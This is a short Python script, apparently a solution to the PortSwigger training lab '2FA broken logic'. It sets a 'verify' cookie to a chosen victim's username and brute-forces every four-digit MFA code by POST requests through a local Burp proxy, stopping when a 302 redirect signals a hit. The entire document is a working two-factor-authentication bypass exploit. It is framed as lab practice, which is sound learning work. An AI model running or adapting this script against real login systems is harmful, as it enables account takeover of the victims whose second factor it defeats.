# PortSwigger
# Lab: 2FA broken logic

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target Data
url = ""
session = ""
verify = "Victim's username"

# Localhost Proxies (To intercept with Burp Suite)
proxies = { 'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080' }

# Request Cookies
cookies = {
    "session": session,
    "verify": verify
}

def main():    
    mfa_code = '0000'

    print("\r(+) Forcing security code...")
    
    for i in range(0, 10000):
        mfa_code = ('0' * (4 - len(str(i)))) + str(i)
        sys.stdout.write("\r%s" % mfa_code)
        sys.stdout.flush()

        playload = f"mfa-code={mfa_code}"
        response = requests.post(url, data=playload, cookies=cookies, verify=False, proxies=proxies)

        if len(response.history) >= 1 and response.history[0].status_code == 302 or response.status_code == 302:
            break

    print('\r(+) The security code is %s' % mfa_code)


if __name__ == "__main__":
    main()